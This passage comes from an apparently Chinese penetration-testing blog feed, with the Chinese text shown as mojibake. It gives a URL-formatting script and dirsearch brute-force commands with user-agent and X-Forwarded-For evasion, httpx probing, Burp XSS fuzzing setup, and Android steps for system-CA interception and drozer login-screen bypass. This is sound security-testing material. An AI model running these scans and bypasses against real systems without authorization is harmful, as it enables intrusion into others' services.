è§£æURLç»“æ„ï¼Œç»Ÿä¸€åè®®ä¸ºå°å†™</span></span><br><span class="line">    parsed = urlparse(raw_url)</span><br><span class="line">    scheme = parsed.scheme.lower()</span><br><span class="line">    netloc = parsed.netloc  <span class="comment"># ä¸»æœº+ç«¯å£ï¼ˆå¦‚â€œtarget.com:8080â€ï¼‰</span></span><br><span class="line">    path = parsed.path      <span class="comment"># è·¯å¾„ï¼ˆå¦‚â€œ/adminâ€ï¼‰</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. ä¿®æ­£åè®®ä¸ç«¯å£çš„åŒ¹é…å…³ç³»ï¼ˆå¦‚httpsç”¨80ç«¯å£â†’æ”¹ä¸º443ï¼‰</span></span><br><span class="line">    default_ports = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;80&quot;</span>, <span class="string">&quot;https&quot;</span>: <span class="string">&quot;443&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> netloc:</span><br><span class="line">        host, port = netloc.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># ç«¯å£éæ•°å­—æ—¶ï¼Œé‡ç½®ä¸ºé»˜è®¤ç«¯å£</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> port.isdigit() <span class="keyword">or</span> <span class="keyword">not</span> (<span class="number">1</span> &lt;= <span class="built_in">int</span>(port) &lt;= <span class="number">65535</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âš ï¸  æ— æ•ˆç«¯å£ï¼š<span class="subst">&#123;port&#125;</span>ï¼Œå·²é‡ç½®ä¸º<span class="subst">&#123;scheme&#125;</span>é»˜è®¤ç«¯å£<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span>)</span><br><span class="line">            netloc = <span class="string">f&quot;<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># åè®®ä¸ç«¯å£ä¸åŒ¹é…æ—¶ï¼Œä¿®æ­£ç«¯å£</span></span><br><span class="line">        <span class="keyword">elif</span> port != default_ports[scheme]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âš ï¸  åè®®ä¸ç«¯å£ä¸åŒ¹é…ï¼š<span class="subst">&#123;scheme&#125;</span>ä½¿ç”¨<span class="subst">&#123;port&#125;</span>ç«¯å£ï¼Œå·²ä¿®æ­£ä¸ºé»˜è®¤<span class="subst">&#123;default_ports[scheme]&#125;</span>ç«¯å£&quot;</span>)</span><br><span class="line">            netloc = <span class="string">f&quot;<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># æ— ç«¯å£æ—¶ï¼Œè¡¥å……åè®®é»˜è®¤ç«¯å£ï¼ˆæ˜¾å¼æŒ‡å®šæ›´è§„èŒƒï¼Œé¿å…dirsearchè§£ææ­§ä¹‰ï¼‰</span></span><br><span class="line">        netloc = <span class="string">f&quot;<span class="subst">&#123;netloc&#125;</span>:<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. æ¸…ç†å†—ä½™è·¯å¾„ï¼ˆä»…ä¿ç•™æ ¹è·¯å¾„â€œ/â€ï¼Œé¿å…ç¼©å°dirsearchæ‰«æèŒƒå›´ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> path <span class="keyword">and</span> path != <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âš ï¸  å†—ä½™è·¯å¾„æ¸…ç†ï¼š<span class="subst">&#123;raw_url&#125;</span> çš„è·¯å¾„<span class="subst">&#123;path&#125;</span>å·²ç§»é™¤ï¼Œdirsearchå°†è‡ªåŠ¨çˆ†ç ´æ‰€æœ‰è·¯å¾„&quot;</span>)</span><br><span class="line">        path = <span class="string">&quot;/&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 5. é‡ç»„URLï¼ˆæ¸…é™¤æŸ¥è¯¢å‚æ•°ã€ç‰‡æ®µç­‰æ— å…³å†…å®¹ï¼Œå¦‚â€œhttp://target.com?a=1#topâ€â†’â€œhttp://target.com:80â€ï¼‰</span></span><br><span class="line">    formatted_url = urlunparse((scheme, netloc, path, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="comment"># ç§»é™¤æ ¹è·¯å¾„æ–œæ ï¼ˆå¦‚â€œhttp://target.com:80/â€â†’â€œhttp://target.com:80â€ï¼Œä¸¤è€…ç­‰æ•ˆä½†æ›´ç®€æ´ï¼‰</span></span><br><span class="line">    formatted_url = re.sub(<span class="string">r&quot;:(\d+)/$&quot;</span>, <span class="string">r&quot;:\1&quot;</span>, formatted_url)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> formatted_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_targets</span>(<span class="params">input_source: <span class="built_in">str</span>, is_file: <span class="built_in">bool</span>, output_file: <span class="built_in">str</span> = <span class="string">&quot;formatted_targets.txt&quot;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ•´ä½“æµç¨‹ï¼šè¯»å–è¾“å…¥â†’è¿‡æ»¤æ— æ•ˆåœ°å€â†’æ ¼å¼åŒ–åˆæ³•åœ°å€â†’ä¿å­˜ç»“æœ</span></span><br><span class="line"><span class="string">    :param input_source: è¾“å…¥æºï¼ˆæ–‡ä»¶è·¯å¾„æˆ–é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line"><span class="string">    :param is_file: æ˜¯å¦ä¸ºæ–‡ä»¶è¾“å…¥</span></span><br><span class="line"><span class="string">    :param output_file: æ ¼å¼åŒ–ç»“æœä¿å­˜è·¯å¾„</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. è¯»å–åŸå§‹ç›®æ ‡åˆ—è¡¨ï¼Œè¿‡æ»¤ç©ºè¡Œå’Œæ³¨é‡Š</span></span><br><span class="line">    raw_targets = []</span><br><span class="line">    <span class="keyword">if</span> is_file:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(input_source, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    line = line.strip()</span><br><span class="line">                    <span class="comment"># è·³è¿‡ç©ºè¡Œå’Œâ€œ#â€å¼€å¤´çš„æ³¨é‡Šè¡Œ</span></span><br><span class="line">                    <span class="keyword">if</span> line <span class="keyword">and</span> <span class="keyword">not</span> line.startswith(<span class="string">&quot;#&quot;</span>):</span><br><span class="line">                        raw_targets.append(line)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âŒ é”™è¯¯ï¼šæ–‡ä»¶<span class="subst">&#123;input_source&#125;</span>ä¸å­˜åœ¨ï¼Œè¯·æ£€æŸ¥è·¯å¾„&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># éæ–‡ä»¶è¾“å…¥ï¼šæŒ‰é€—å·åˆ†å‰²ï¼Œè¿‡æ»¤ç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">        raw_targets = [t.strip() <span class="keyword">for</span> t <span class="keyword">in</span> input_source.split(<span class="string">&quot;,&quot;</span>) <span class="keyword">if</span> t.strip()]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> raw_targets:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;âŒ æœªæ£€æµ‹åˆ°ä»»ä½•æœ‰æ•ˆè¾“å…¥ï¼Œè¯·æ£€æŸ¥ç›®æ ‡å†…å®¹&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. æ‰¹é‡å¤„ç†ï¼šæ ¡éªŒâ†’æ ¼å¼åŒ–</span></span><br><span class="line">    valid_formatted = []</span><br><span class="line">    invalid_list = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å¼€å§‹å¤„ç†ï¼ˆå…±<span class="subst">&#123;<span class="built_in">len</span>(raw_targets)&#125;</span>ä¸ªåŸå§‹ç›®æ ‡ï¼‰ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    <span class="keyword">for</span> idx, target <span class="keyword">in</span> <span class="built_in">enumerate</span>(raw_targets, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> is_valid_target(target):</span><br><span class="line">            <span class="comment"># åˆæ³•ç›®æ ‡ï¼šæ ¼å¼åŒ–ååŠ å…¥ç»“æœåˆ—è¡¨</span></span><br><span class="line">            formatted = format_valid_target(target)</span><br><span class="line">            valid_formatted.append(formatted)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âœ… <span class="subst">&#123;idx:2d&#125;</span>. åˆæ³•åœ°å€ï¼š<span class="subst">&#123;target:35s&#125;</span> â†’ æ ¼å¼åŒ–åï¼š<span class="subst">&#123;formatted&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># æ— æ•ˆç›®æ ‡ï¼šè®°å½•åˆ°æ— æ•ˆåˆ—è¡¨ï¼Œä¸å‚ä¸åç»­å¤„ç†</span></span><br><span class="line">            invalid_list.append(target)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âŒ <span class="subst">&#123;idx:2d&#125;</span>. æ— æ•ˆåœ°å€ï¼š<span class="subst">&#123;target:35s&#125;</span>ï¼ˆéåŸŸå/IPï¼Œå·²è¿‡æ»¤ï¼‰&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. ä¿å­˜æ ¼å¼åŒ–ç»“æœ</span></span><br><span class="line">    <span class="keyword">if</span> valid_formatted:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&quot;\n&quot;</span>.join(valid_formatted))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†å®Œæˆï¼ç»Ÿè®¡å¦‚ä¸‹ï¼š&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“Š åŸå§‹ç›®æ ‡æ€»æ•°ï¼š<span class="subst">&#123;<span class="built_in">len</span>(raw_targets)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âœ… æœ‰æ•ˆæ ¼å¼åŒ–ç›®æ ‡æ•°ï¼š<span class="subst">&#123;<span class="built_in">len</span>(valid_formatted)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âŒ æ— æ•ˆåœ°å€æ•°ï¼ˆå·²è¿‡æ»¤ï¼‰ï¼š<span class="subst">&#123;<span class="built_in">len</span>(invalid_list)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“ ç»“æœä¿å­˜è·¯å¾„ï¼š<span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ’¡ ä½¿ç”¨æ–¹å¼ï¼špython dirsearch.py -l <span class="subst">&#123;output_file&#125;</span> [å…¶ä»–å‚æ•°]&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âŒ å¤„ç†å®Œæˆï¼Œä½†æœªæ£€æµ‹åˆ°ä»»ä½•æœ‰æ•ˆç›®æ ‡ï¼ˆæ‰€æœ‰è¾“å…¥å‡ä¸ºéåœ°å€å­—ç¬¦ï¼‰&quot;</span>)</span><br><span class="line">        <span class="comment"># é¿å…ç”Ÿæˆç©ºæ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(output_file):</span><br><span class="line">            os.remove(output_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="comment"># å‘½ä»¤è¡Œå‚æ•°è§£æ</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;dirsearchç›®æ ‡URLå¤„ç†å·¥å…·ï¼šå…ˆæ ¡éªŒåˆæ³•æ€§ï¼Œå†æ ‡å‡†åŒ–æ ¼å¼åŒ–&quot;</span>)</span><br><span class="line">    group = parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">    group.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;è¾“å…¥ç›®æ ‡æ–‡ä»¶è·¯å¾„ï¼ˆæ¯è¡Œ1ä¸ªç›®æ ‡ï¼Œæ”¯æŒ#æ³¨é‡Šå’Œç©ºè¡Œï¼‰&quot;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--urls&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;ç›´æ¥è¾“å…¥ç›®æ ‡åˆ—è¡¨ï¼ˆç”¨é€—å·åˆ†éš”ï¼Œå¦‚\&quot;target.com,192.168.1.1:8080\&quot;ï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, default=<span class="string">&quot;formatted_targets.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;ç»“æœä¿å­˜æ–‡ä»¶ï¼ˆé»˜è®¤ï¼šformatted_targets.txtï¼‰&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰§è¡Œå¤„ç†é€»è¾‘</span></span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        process_targets(input_source=args.file, is_file=<span class="literal">True</span>, output_file=args.output)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        process_targets(input_source=args.urls, is_file=<span class="literal">False</span>, output_file=args.output)</span><br></pre></td></tr></table></figure>

 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python url_formatter.py -f raw_targets.txt -o valid_targets.txt</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="çˆ†ç ´å•ä¸ªç›®æ ‡"><a href="#çˆ†ç ´å•ä¸ªç›®æ ‡" class="headerlink" title="çˆ†ç ´å•ä¸ªç›®æ ‡"></a>çˆ†ç ´å•ä¸ªç›®æ ‡</h3><ol>
<li><p>æœ€ä½³è¯­æ³•</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -e php,html,js,txt -t 15 --delay 0.5 --random-agent --exclude-status 404,403,500-599 --exclude-sizes 0B,1KB-2KB --cookie &quot;PHPSESSID=random_value; X-Requested-With=XMLHttpRequest&quot; -w /usr/share/wordlists/dirb/common.txt --format json -o target_scan_result.json -u http://target.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>æå–è·¯å¾„</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;target_scan_result.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"><span class="comment"># æå–çŠ¶æ€ç 200çš„æœ‰æ•ˆè·¯å¾„</span></span><br><span class="line">valid_paths = [entry[<span class="string">&quot;path&quot;</span>] <span class="keyword">for</span> entry <span class="keyword">in</span> data[<span class="string">&quot;results&quot;</span>] <span class="keyword">if</span> entry[<span class="string">&quot;status&quot;</span>] == <span class="number">200</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æœ‰æ•ˆè·¯å¾„ï¼š&quot;</span>, valid_paths)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="å¤šç›®æ ‡è·¯å¾„çˆ†ç ´"><a href="#å¤šç›®æ ‡è·¯å¾„çˆ†ç ´" class="headerlink" title="å¤šç›®æ ‡è·¯å¾„çˆ†ç ´"></a>å¤šç›®æ ‡è·¯å¾„çˆ†ç ´</h3><ol>
<li><p>æœ€ä½³å®è·µ</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -e php,html,js,txt,asp -t 10 --delay 1 --random-agent -H &quot;X-Forwarded-For: 8.8.8.8&quot; --exclude-status 404,403,500-599 --exclude-sizes 0B,1KB-3KB --max-time 300 --session multi_target_scan.session -w /usr/share/wordlists/dirb/common.txt --format json -o multi_target_results.json -l /path/to/target_urls.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>è·¯å¾„æå–</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">result_dir = <span class="string">&quot;multi_target_results&quot;</span></span><br><span class="line">valid_paths = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ‰€æœ‰ç›®æ ‡çš„JSONç»“æœæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(result_dir):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.json&quot;</span>):</span><br><span class="line">        target = filename.replace(<span class="string">&quot;.json&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(result_dir, filename), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = json.load(f)</span><br><span class="line">        <span class="comment"># æå–çŠ¶æ€ç 200ã€å“åº”å¤§å°&gt;3KBçš„è·¯å¾„</span></span><br><span class="line">        <span class="keyword">for</span> entry <span class="keyword">in</span> data[<span class="string">&quot;results&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> entry[<span class="string">&quot;status&quot;</span>] == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">int</span>(entry[<span class="string">&quot;size&quot;</span>].replace(<span class="string">&quot;KB&quot;</span>, <span class="string">&quot;&quot;</span>)) &gt; <span class="number">3</span>:</span><br><span class="line">                valid_paths.append(&#123;<span class="string">&quot;target&quot;</span>: target, <span class="string">&quot;path&quot;</span>: entry[<span class="string">&quot;path&quot;</span>], <span class="string">&quot;size&quot;</span>: entry[<span class="string">&quot;size&quot;</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºæ•´ç†åçš„æœ‰æ•ˆè·¯å¾„</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> valid_paths:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ç›®æ ‡ï¼š<span class="subst">&#123;item[<span class="string">&#x27;target&#x27;</span>]&#125;</span> | æœ‰æ•ˆè·¯å¾„ï¼š<span class="subst">&#123;item[<span class="string">&#x27;path&#x27;</span>]&#125;</span> | å¤§å°ï¼š<span class="subst">&#123;item[<span class="string">&#x27;size&#x27;</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="httpx"><a href="#httpx" class="headerlink" title="httpx"></a>httpx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">httpxåŠŸèƒ½å¾ˆå¤šï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¹é‡æ¢æµ‹å­˜æ´»çš„ç›®æ ‡å³å¯ï¼ˆæ‰¹é‡è®¿é—®ï¼Œç„¶è·å–StatusCodeã€Titleã€ipç­‰æ ¸å¿ƒå­—æ®µï¼Œäººå·¥åˆ¤æ–­å­˜æ´»å³å¯ï¼‰</span></span><br><span class="line">httpx -sc -cl -title -ip -t 120 -fr -csv -o &quot;httpx-hosts.csv&quot; -l &quot;hosts.txt&quot;</span><br><span class="line"></span><br><span class="line">	-sc: Status Code</span><br><span class="line">	-cl: Content Length</span><br><span class="line">	-title: Page Title</span><br><span class="line">	-ip: A/AAAA/CNAME</span><br><span class="line">	-t: threads</span><br><span class="line">	-fr: follow redirect</span><br><span class="line">	-csv -o: save xxx.csv</span><br><span class="line">	-l: a list of hosts</span><br></pre></td></tr></table></figure>

<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><h3 id="xssValidator"><a href="#xssValidator" class="headerlink" title="xssValidator"></a>xssValidator</h3><ol>
<li><p>BurpStoreä¸‹è½½xssValidatoræ’ä»¶</p>
</li>
<li><p>Intruderè®¾ç½®payload</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211149773.png" alt="image-20251116211149773"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211301073.png" alt="image-20251116211301073"></p>
</li>
<li><p>åœ¨Intruderçš„Settingæ¨¡å—ä¸­ï¼Œæ·»åŠ å¯¹ç»“æœè¿›è¡Œå…³é”®å­—åŒ¹é…ï¼ˆæœ€å¥½å…·æœ‰æ ‡å¿—æ€§ï¼Œä¸è¦å’Œæ­£å¸¸ä»£ç æ··æ·†äº†ï¼‰</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211447510.png" alt="image-20251116211447510"></p>
</li>
<li><p>åœ¨xssValidatoræ’ä»¶ä¸­è®¾ç½®åŒæ ·çš„å…³é”®å­—</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211535215.png" alt="image-20251116211535215"></p>
</li>
<li><p>å¼€å§‹çˆ†ç ´</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211758912.png" alt="image-20251116211758912"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>çº¢é˜Ÿ</category>
      </categories>
      <tags>
        <tag>æ­¦å™¨åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>APKå®‰å…¨æµ‹è¯•</title>
    <url>/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<blockquote>
<p>Referenceï¼š</p>
<ol>
<li><a href="https://blog.csdn.net/qq_40037555/article/details/151819602">ã€APKå®‰å…¨ã€‘APKåº”ç”¨å®‰å…¨æµ‹è¯•ç­–ç•¥-CSDNåšå®¢</a></li>
<li><a href="https://xz.aliyun.com/news/11538">Android APP-å››å¤§ç»„ä»¶å®‰å…¨æµ‹è¯•-å…ˆçŸ¥ç¤¾åŒº</a></li>
<li><a href="https://www.jianshu.com/p/826439b24467">https://www.jianshu.com/p/826439b24467</a></li>
<li><a href="https://www.cnblogs.com/hetianlab/p/19048752">Androidå››å¤§ç»„ä»¶å®‰å…¨æ¼æ´å®æˆ˜ - èšæ™¯ç½‘å®‰å®éªŒå®¤ - åšå®¢å›­</a></li>
</ol>
</blockquote>
<h2 id="How-to-sniff-packet"><a href="#How-to-sniff-packet" class="headerlink" title="How to sniff packet?"></a>How to sniff packet?</h2><ol>
<li><p>There is just a detection for client to check system cert.</p>
<ul>
<li><p>Import ca-cert from burp: burp.der</p>
</li>
<li><p>Transform .der to .pem through openssl</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform DER -in burp.der -out burp.pem</span><br><span class="line">openssl x509 -subject_hash_old -in burp.pemï¼ˆmaybe the result is &quot;9a5ba575&quot;ï¼‰</span><br><span class="line">mv burp.pem 9a5ba575.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>adb root</p>
</li>
<li><p>adb push 9a5ba575.0 &#x2F;sdcard&#x2F;download</p>
</li>
<li><p>adb shell mv &#x2F;sdcard&#x2F;Downlaod&#x2F;9a5ba575.0 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;</p>
</li>
<li><p>adb shell chmod 644 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;9a5ba575.0</p>
</li>
</ul>
</li>
<li><p>If there are built-in certificates within the clientï¼šreverse the app and hook the cert.</p>
</li>
</ol>
<h2 id="åFridaè°ƒè¯•"><a href="#åFridaè°ƒè¯•" class="headerlink" title="åFridaè°ƒè¯•"></a>åFridaè°ƒè¯•</h2><h3 id="ä¿®æ”¹å¯åŠ¨ç«¯å£"><a href="#ä¿®æ”¹å¯åŠ¨ç«¯å£" class="headerlink" title="ä¿®æ”¹å¯åŠ¨ç«¯å£"></a>ä¿®æ”¹å¯åŠ¨ç«¯å£</h3><p><img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173121566.png" alt="image-20251015173121566"></p>
<p><img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173149587.png" alt="image-20251015173149587"></p>
<h2 id="Four-Major-Components"><a href="#Four-Major-Components" class="headerlink" title="Four Major Components"></a>Four Major Components</h2><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><table>
<thead>
<tr>
<th align="center">Attack Surface</th>
<th align="center">Harm</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Unauthorized Access</td>
<td align="center">ä¾‹å¦‚ï¼šç»•è¿‡ç™»é™†ç•Œé¢ï¼Œç›´æ¥è°ƒç”¨ã€è®¿é—®åé¢çš„activityç•Œé¢</td>
</tr>
<tr>
<td align="center">DoS</td>
<td align="center">é€šè¿‡Intentç»™Activityä¼ è¾“ç•¸å½¢æ•°æ®ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒ</td>
</tr>
<tr>
<td align="center">Implicit Itent Hajacking</td>
<td align="center">æ”¾åœ¨ä¸€ä¸ªä¸€æ ·çš„ç•Œé¢ï¼Œæ”¶é›†ç”¨æˆ·çš„è´¦å·å¯†ç </td>
</tr>
</tbody></table>
<h4 id="Unauthorized-Access"><a href="#Unauthorized-Access" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
<li><p>Deploy environment</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. æµ‹è¯•APPï¼šhttps://github.com/as0ler/Android-Examples</span><br><span class="line">2. æµ‹è¯•å·¥å…·ï¼šhttps://github.com/ReversecLabs/drozer; https://github.com/ReversecLabs/drozer-agent</span><br></pre></td></tr></table></figure>
</li>
<li><p>Start the test app(testapp) and get itâ€™s package name with â€œApp messengerâ€ or other ways</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105330948.png" alt="image-20250922105330948"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131340290.png" alt="image-20250922131340290"></p>
</li>
<li><p>Connect the device and enter drozerâ€™s console.</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131448232.png" alt="image-20250922131448232"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105753249.png" alt="image-20250922105753249"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105838954.png" alt="image-20250922105838954"></p>
</li>
<li><p>Fint attacksufaces of the app.</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface YourPacakgeName</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922110258485.png" alt="image-20250922110258485"></p>
</li>
<li><p>Verify exported activities</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.activity.info -a YourPackageName</span><br></pre></td></tr></table></figure>

<p> <img src="C:\Users\RedTeamer\AppData\Roaming\Typora\typora-user-images\image-20250922110649496.png" alt="image-20250922110649496"></p>
</li>
<li><p>Start other activity to bypass MainActivity</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.activity.start --component YourPackageName YourPackageName.ActivityName</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922111040903.png" alt="image-20250922111040903"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131826719.png" alt="image-20250922131826719"></p>
</li>
</ol>
